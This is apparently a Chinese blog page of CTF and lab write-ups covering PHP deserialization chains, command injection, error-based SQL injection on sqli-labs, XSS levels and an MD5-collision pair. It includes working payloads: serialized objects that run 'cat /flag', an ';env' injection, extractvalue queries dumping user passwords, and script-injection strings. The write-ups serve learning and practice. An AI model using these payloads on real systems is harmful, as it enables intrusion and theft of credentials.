+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?a=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%00%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%55%5d%83%60%fb%5f%07%fe%a2&amp;b=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%02%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%d5%5d%83%60%fb%5f%07%fe%a2</span><br></pre></td></tr></table></figure>
+
+<ol>
+<li>%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%00%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%55%5d%83%60%fb%5f%07%fe%a2</li>
+<li>%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%02%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%d5%5d%83%60%fb%5f%07%fe%a2</li>
+</ol>
+<h2 id="PHP-反序列化漏洞"><a href="#PHP-反序列化漏洞" class="headerlink" title="PHP 反序列化漏洞"></a><strong>PHP 反序列化漏洞</strong></h2><h2 id="moectf-web-09-第九章-星墟禁制·天机问路"><a href="#moectf-web-09-第九章-星墟禁制·天机问路" class="headerlink" title="moectf web 09 第九章 星墟禁制·天机问路"></a>moectf web 09 第九章 星墟禁制·天机问路</h2><p>题目：让你输入url</p>
+<p>1.随便输一个，发现网址变成</p>
+<p><a target="_blank" rel="noopener" href="http://127.0.0.1:62792/?url=www.baidu.com">http://127.0.0.1:62792/?url=www.baidu.com</a></p>
+<p>那么<code>;</code>直接闭合它，再后面加上指令</p>
+<p>ls -l</p>
+<p>发现没有任何信息，猜测再env里面</p>
+<p>输入<code>1;env</code>,得到</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">KUBERNETES_SERVICE_PORT_HTTPS=443</span><br><span class="line">KUBERNETES_PORT_443_TCP=tcp://10.43.0.1:443</span><br><span class="line">PHPIZE_DEPS=autoconf 		dpkg-dev dpkg 		file 		g++ 		gcc 		libc-dev 		make 		pkgconf 		re2c</span><br><span class="line">KUBERNETES_SERVICE_HOST=10.43.0.1</span><br><span class="line">PWD=/app</span><br><span class="line">PHP_SHA256=475f991afd2d5b901fb410be407d929bc00c46285d3f439a02c59e8b6fe3589c</span><br><span class="line">FLAG=moectf&#123;bf86146f-bae834&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+
+
+
+
+<h2 id="17-第十七章-星骸迷阵·神念重构"><a href="#17-第十七章-星骸迷阵·神念重构" class="headerlink" title="17 第十七章 星骸迷阵·神念重构"></a>17 第十七章 星骸迷阵·神念重构</h2><p>诶哟，我真的要杀人了，鬼题目炒了几个答案都是错的</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">highlight_file(__FILE__); // 显示当前代码，方便看结构</span><br><span class="line"></span><br><span class="line">class A &#123;</span><br><span class="line">    public $a; // 可控的属性，用来注入恶意代码</span><br><span class="line">    function __destruct() &#123; // 对象销毁时触发</span><br><span class="line">        eval($this-&gt;a); // 执行$a属性里的代码（核心执行点）</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if(isset($_GET[&#x27;a&#x27;])) &#123; // 接收GET参数a</span><br><span class="line">    unserialize($_GET[&#x27;a&#x27;]); // 把参数a的字符串还原成对象</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>代审：把命令行输给a就ok</p>
+<p>但是输入：<a target="_blank" rel="noopener" href="http://127.0.0.1:46309/?a=ls%20flag%E5%90%8E%E5%BE%97%E5%88%B0%E4%BA%86%EF%BC%9A">http://127.0.0.1:46309/?a=ls%20flag后得到了：</a></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Notice**: unserialize(): Error at offset 0 of 7 bytes in **/app/index.php** on line **12**</span><br></pre></td></tr></table></figure>
+
+<p>这个报错的核心意思是：<strong>你传给<code>unserialize()</code>的字符串（共 7 字节），从第 0 位（第一个字符）开始就不符合 PHP 序列化格式，反序列化函数根本没法解析</strong>。</p>
+<p>对不起没看到这里：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">if(isset($_GET[&#x27;a&#x27;])) &#123;</span><br><span class="line">    unserialize($_GET[&#x27;a&#x27;]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>知识点1：</p>
+<p><code>unserialize()</code>反序列化：（后端拿到a后反序列化，那么我们只要序列化就ok）</p>
+<p>序列化格式：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:类名长度:&quot;类名&quot;:属性数量:&#123;s:属性名长度:&quot;属性名&quot;;s:指令长度:&quot;要执行的指令&quot;;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>很麻烦可以直接写脚本：</p>
+<p>脚本1：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// 1. 定义和题目完全一样的类A</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>; <span class="comment">// 属性名必须和题目一致</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 2. 创建对象，给$a赋值为读flag的代码</span></span><br><span class="line"><span class="variable">$obj</span> = <span class="keyword">new</span> <span class="title function_ invoke__">A</span>();</span><br><span class="line"><span class="comment">// 选哪种代码？看环境：</span></span><br><span class="line"><span class="comment">// - 想先验证链路：$obj-&gt;a = &quot;phpinfo();&quot;;（调出PHP信息面板）</span></span><br><span class="line"><span class="comment">// - 想直接读flag：$obj-&gt;a = &quot;system(&#x27;cat /flag&#x27;);&quot;;（执行系统命令读flag）</span></span><br><span class="line"><span class="variable">$obj</span>-&gt;a = <span class="string">&quot;system(\&quot;cat /flag\&quot;);&quot;</span>; <span class="comment">// ’\‘是为了转义，不然前面一个引号后面闭合他以为语句就结束了</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$obj</span>); <span class="comment">// 输出：O:1:&quot;A&quot;:1:&#123;s:1:&quot;a&quot;;s:20:&quot;system(&quot;cat /flag&quot;);&quot;;&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+
+
+<p><code>__destruct()方法</code></p>
+<p>对象销毁时触发</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">这行代码执行完后，$obj没有任何其他地方引用（没有赋值给其他变量、没有后续调用），PHP判定「这个对象没用了」；</span><br><span class="line">PHP准备销毁$obj，触发A类的__destruct()方法；</span><br><span class="line">__destruct()里的eval($this-&gt;a)执行，也就是执行system(&quot;cat /flag&quot;);</span><br></pre></td></tr></table></figure>
+
+
+
+<p>脚本2：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line"></span><br><span class="line">class A &#123;</span><br><span class="line">    public $a=&#x27;system(&quot;cat /flag&quot;);&#x27;;</span><br><span class="line">    function __destruct() &#123;</span><br><span class="line">        eval($this-&gt;a);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$b=new A;</span><br><span class="line">$c=serialize($b);</span><br><span class="line">echo $c;</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+
+
+<p>new：</p>
+<p><code>new</code> 是 PHP 里「创建对象」的关键字 —— 没有 <code>new</code>，就造不出 <code>A</code> 类的实例对象</p>
+<p>A是设计图纸，new A才是能用的实体物品</p>
+<h5 id="解题思路："><a href="#解题思路：" class="headerlink" title="解题思路："></a>解题思路：</h5><p>1.代审发现我们需要 以序列化的格式 ，给a传参</p>
+<p>2.构造序列化的<code>&#39;system(&quot;\cat /flag\&quot;);&#39;</code></p>
+<p>​	<code>system()</code>：PHP 的<strong>系统命令执行函数</strong></p>
+<p>​	PHP 本身不能直接执行<code>cat /flag</code>，必须通过<code>system()</code>这类函数 “桥接”—— 把系统命令作为参数传给<code>system()</code>，PHP 才会调用系统	去执行这个命令。</p>
+<p>​	引号：PHP 里，所有要执行的代码 &#x2F; 文本，只要是 “字符串形式”，就必须用引号（单引号<code>&#39;</code>或双引号<code>&quot;</code>）包裹</p>
+<p>3.拼接url</p>
+<h2 id="18-第十八章-万卷诡阁·功法连环"><a href="#18-第十八章-万卷诡阁·功法连环" class="headerlink" title="18 第十八章 万卷诡阁·功法连环"></a>18 第十八章 万卷诡阁·功法连环</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line"></span><br><span class="line">class PersonA &#123;</span><br><span class="line">  private $name;</span><br><span class="line">  function __wakeup() &#123;</span><br><span class="line">    $name=$this-&gt;name;</span><br><span class="line">    $name-&gt;work();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class PersonB &#123;</span><br><span class="line">  public $name;</span><br><span class="line">  function work()&#123;</span><br><span class="line">    $name=$this-&gt;name;</span><br><span class="line">    eval($name);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if(isset($_GET[&#x27;person&#x27;])) &#123;</span><br><span class="line">  unserialize($_GET[&#x27;person&#x27;]);  //person只是参数名，接收方查看人的名字，不用管他；我一直认为这里要改成name，其实不用</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">PersonA</span> </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;name = <span class="keyword">new</span> <span class="title function_ invoke__">PersonB</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$name</span>=<span class="variable language_">$this</span>-&gt;name;</span><br><span class="line">        <span class="variable">$name</span>-&gt;<span class="title function_ invoke__">work</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">PersonB</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;name = <span class="string">&quot;system(&#x27;ls /&#x27;);&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$A</span> = <span class="keyword">new</span> <span class="title function_ invoke__">PersonA</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$A</span>);</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<h2 id="19-第十九章-星穹真相·补天归源"><a href="#19-第十九章-星穹真相·补天归源" class="headerlink" title="19 第十九章 星穹真相·补天归源"></a>19 第十九章 星穹真相·补天归源</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"> &lt;?php</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line"></span><br><span class="line">class Person</span><br><span class="line">&#123;</span><br><span class="line">    public $name;</span><br><span class="line">    public $id;</span><br><span class="line">    public $age;</span><br><span class="line"></span><br><span class="line">    public function __invoke($id)</span><br><span class="line">    &#123;</span><br><span class="line">        $name = $this-&gt;id;</span><br><span class="line">        $name-&gt;name = $id;</span><br><span class="line">        $name-&gt;age = $this-&gt;name;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class PersonA extends Person</span><br><span class="line">&#123;</span><br><span class="line">    public function __destruct()</span><br><span class="line">    &#123;</span><br><span class="line">        $name = $this-&gt;name;</span><br><span class="line">        $id = $this-&gt;id;</span><br><span class="line">        $age = $this-&gt;age;</span><br><span class="line">        $name-&gt;$id($age);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class PersonB extends Person</span><br><span class="line">&#123;</span><br><span class="line">    public function __set($key, $value)</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;name = $value;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class PersonC extends Person</span><br><span class="line">&#123;</span><br><span class="line">    public function __Check($age)</span><br><span class="line">    &#123;</span><br><span class="line">        if(str_contains($this-&gt;age . $this-&gt;name,&quot;flag&quot;))</span><br><span class="line">        &#123;</span><br><span class="line">            die(&quot;Hacker!&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">        $name = $this-&gt;name;</span><br><span class="line">        $name($age);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function __wakeup()</span><br><span class="line">    &#123;</span><br><span class="line">        $age = $this-&gt;age;</span><br><span class="line">        $name = $this-&gt;id;</span><br><span class="line">        $name-&gt;age = $age;</span><br><span class="line">        $name($this);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if(isset($_GET[&#x27;person&#x27;]))</span><br><span class="line">&#123;</span><br><span class="line">    $person = unserialize($_GET[&#x27;person&#x27;]);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>
+
+
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class PersonA &#123;</span><br><span class="line">    public $name;</span><br><span class="line">    public $id;</span><br><span class="line">    public $age;</span><br><span class="line">&#125;</span><br><span class="line">class PersonC &#123;</span><br><span class="line">    public $name;</span><br><span class="line">    public $id;</span><br><span class="line">    public $age;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$pc = new PersonC();</span><br><span class="line">$pc-&gt;name = &#x27;system&#x27;;</span><br><span class="line">$pc-&gt;age = &quot;&quot;;</span><br><span class="line">$pa = new PersonA();</span><br><span class="line">$pa-&gt;name = $pc;</span><br><span class="line">$pa-&gt;id = &#x27;__Check&#x27;;</span><br><span class="line">$pa-&gt;age = &#x27;cat /flag&#x27;;</span><br><span class="line">echo urlencode(serialize($pa));</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+
+
+
+
+<h2 id="sqli-5题解"><a href="#sqli-5题解" class="headerlink" title="sqli-5题解"></a>sqli-5题解</h2><p>对于怎样输入都没有回显位的题目，考虑[报错注入]，这样我们就可以通过报错和获取信息</p>
+<p>1.判断有无注入点 </p>
+<p>?id&#x3D;1 ?id&#x3D;1’ ，两个页面返回不一样，说明没有过滤<code>&#39;</code>,存在注入点</p>
+<p>2.判断注入类型：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">//判断字符型</span><br><span class="line">?id=1&#x27; and &#x27;1&#x27;=&#x27;1</span><br><span class="line">?id=1&#x27; and &#x27;1&#x27;=&#x27;2</span><br><span class="line"></span><br><span class="line">//判断数字型      </span><br><span class="line">?id=1 and 1=1</span><br><span class="line">?id=1 and 1=2</span><br></pre></td></tr></table></figure>
+
+<p>3.判断有几个字段</p>
+<p>（为什么要判断，因为要让数据库允许你插入，就要让你自己的select列数&#x3D;原始后台select列数</p>
+<p>像这样：</p>
+<p>【原始查询】     SELECT a, b, c FROM xxx<br>【你注入的查询】 UNION SELECT x, y, z）</p>
+<p>?id&#x3D;1’ order by 3–+</p>
+<p>?id&#x3D;1’ order by 4–+</p>
+<p>4.确定回显位</p>
+<p>?id&#x3D;-1’ union select 1,2,3–+</p>
+<p>发现没有报错，也没回显，用报错注入</p>
+<p>5.报表名(必须写0x7e，~在语法里面是另外一种意思)</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27; and extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e))--+</span><br></pre></td></tr></table></figure>
+
+
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">XPATH syntax error: &#x27;~emails,referers,uagents,users~&#x27;</span><br></pre></td></tr></table></figure>
+
+<p>6.报列名</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27; and extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=&#x27;users&#x27;),0x7e))--+</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">XPATH syntax error: &#x27;~id,username,password~&#x27;</span><br></pre></td></tr></table></figure>
+
+<p>7.报具体数据</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select group_concat(username,&#x27;~&#x27;,password) from users</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27; and extractvalue(1,concat(0x7e,(select group_concat(username,0x7e,password) from users),0x7e))--+</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">XPATH syntax error: <span class="string">&#x27;~Dumb~Dumb,Angelina~I-kill-you,D&#x27;</span></span><br></pre></td></tr></table></figure>
+
+
+
+<h1 id="xss"><a href="#xss" class="headerlink" title="xss"></a>xss</h1><h2 id="第二章-web进阶-XSS闯关-1"><a href="#第二章-web进阶-XSS闯关-1" class="headerlink" title="[第二章 web进阶]XSS闯关 1"></a>[第二章 web进阶]XSS闯关 1</h2><h2 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h2><h3 id="第一关："><a href="#第一关：" class="headerlink" title="第一关："></a>第一关：</h3><p><a target="_blank" rel="noopener" href="http://feeb9918-1100-446f-bc56-9c005eeb90ab.node5.buuoj.cn:81/level1?username=xss">http://feeb9918-1100-446f-bc56-9c005eeb90ab.node5.buuoj.cn:81/level1?username=xss</a></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(&#x27;xss&#x27;)&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+<h3 id="第二关："><a href="#第二关：" class="headerlink" title="第二关："></a>第二关：</h3><p>发现输入后没有回显，现在开始代审吧</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;div id=&quot;root&quot; class=&quot;app-wrapper amis-scope&quot;&gt;&lt;div class=&quot;amis-routes-wrapper&quot;&gt;&lt;div class=&quot;a-Toast-wrap a-Toast-wrap--topRight&quot;&gt;&lt;/div&gt;&lt;div class=&quot;a-Page&quot;&gt;&lt;div class=&quot;a-Page-content&quot;&gt;&lt;div class=&quot;a-Page-main&quot;&gt;&lt;div class=&quot;a-Page-header&quot;&gt;&lt;h2 class=&quot;a-Page-title&quot;&gt;&lt;span class=&quot;a-TplField&quot;&gt;XSS test platform&lt;/span&gt;&lt;/h2&gt;&lt;/div&gt;&lt;div class=&quot;a-Page-body&quot;&gt;&lt;span class=&quot;a-TplField&quot;&gt;</span><br><span class="line">    	&lt;div id=&quot;ccc&quot;&gt;</span><br><span class="line">    		                 //这里很重要，有东西等会会被放进来</span><br><span class="line">    	&lt;/div&gt;</span><br><span class="line">    &lt;/span&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;</span><br><span class="line">    &lt;script type=&quot;text/javascript&quot;&gt;</span><br><span class="line">    	if(location.search == &quot;&quot;)&#123;</span><br><span class="line">    		location.search = &quot;?username=xss&quot;</span><br><span class="line">    	&#125;</span><br><span class="line">    	var username = &#x27;xss&#x27;;</span><br><span class="line">    	document.getElementById(&#x27;ccc&#x27;).innerHTML= &quot;Welcome &quot; + escape(username);</span><br><span class="line">    &lt;/script&gt;</span><br><span class="line"></span><br><span class="line">&lt;/body&gt;&lt;/html&gt;</span><br></pre></td></tr></table></figure>
+
+<p>1.<code>escape()</code>：<strong>只转义「特殊字符」，普通字母 &#x2F; 数字不处理</strong></p>
+<ul>
+<li><p>若<code>username</code>是<code>&lt;script&gt;</code>，<code>escape()</code>会转成：<code>%3Cscript%3E</code>；</p>
+</li>
+<li><p>转义后的字符串通过<code>innerHTML</code>渲染时，会被当成 “普通文本” 而非 “HTML&#x2F;JS 代码”，无法执行恶意脚本。</p>
+</li>
+<li><p>3.<code>document.getElementById(&#39;xxx&#39;)</code> 作用是：</p>
+<p><strong>在整个页面中，找到唯一的、<code>id</code> 属性等于 <code>xxx</code> 的 HTML 元素</strong>。</p>
+</li>
+</ul>
+<ol start="2">
+<li><code>innerHTML</code>：JS 给 DOM 元素 “塞内容” 的方式，但它有个 “危险特性”：<strong>会把字符串当成 HTML 代码解析，而不是纯文本</strong>。</li>
+</ol>
+<p>​            &#96;<div id="ccc">Welcome username</div></p>
+<p>3.<code>document.getElementById(&#39;xxx&#39;)</code> 作用是：</p>
+<p><strong>在整个页面中，找到唯一的、<code>id</code> 属性等于 <code>xxx</code> 的 HTML 元素</strong>。</p>
+<p>所以我们只要在var username &#x3D; ‘xss’;这句话里面插入payload就行，</p>
+<p>因为执行顺序：后端js拿到username数据，放进去，再把代码返回给前端</p>
+<p>​	    前端拿到代码后，一句一句执行，我们在var username &#x3D; ‘xss’;这句话中就弹窗，就不用管后面的<code>document.getElementById(&#39;ccc&#39;).innerHTML= &quot;Welcome &quot; + escape(username);</code>这句话了</p>
+<p>输入 username&#x3D;1’;alert(‘1’);&#x2F;&#x2F;</p>
+<p>拼接后变成：var username &#x3D; ‘1’;      alert(1);      &#x2F;&#x2F;</p>
+<h2 id="11-第十一章-千机变·破妄之眼"><a href="#11-第十一章-千机变·破妄之眼" class="headerlink" title="11 第十一章 千机变·破妄之眼"></a>11 第十一章 千机变·破妄之眼</h2><p>省流：HDdss看到了 <strong>GET</strong>  参数名由<code>m,n,o,p,q</code>这五个字母组成（每个字母出现且仅出现一次），长度正好为 5，虽然不清楚字母的具体顺序，但是他知道<strong>参数名等于参数值</strong>才能进入。</p>
+<p>import itertools<br>import requests</p>
+<p>for p in itertools.permutations(“mnopq”):<br>    k &#x3D; “”.join(p)<br>    r &#x3D; requests.get(“<a target="_blank" rel="noopener" href="http://127.0.0.1:48386/">http://127.0.0.1:48386/</a>“, params&#x3D;{k: k})<br>    if “flag” in r.text:<br>        print(k)<br>        print(r.text)<br>        break</p>
+<p><img src="/images/image-20251218152437400.png" alt="image-20251218152437400"></p>
+<h2 id="安洵杯-2019-easy-web"><a href="#安洵杯-2019-easy-web" class="headerlink" title="[安洵杯 2019]easy_web"></a>[安洵杯 2019]easy_web</h2><h3 id="1-3"><a href="#1-3" class="headerlink" title="1"></a>1</h3><p>整个网页就个图片，但是我们发现url有点东西</p>
+<p><img src="/images/image-20260122202902191.png" alt="image-20260122202902191"></p>
+<p>img后面跟着乱七八糟的东西，还有一个cmd，那我们就很想利用一下了</p>
+<p>直接试了ls，cat发现都被过滤了；而且还发现一直有个提示：md5 is fun</p>
+<p><img src="/images/image-20260122203011054.png" alt="image-20260122203011054"></p>
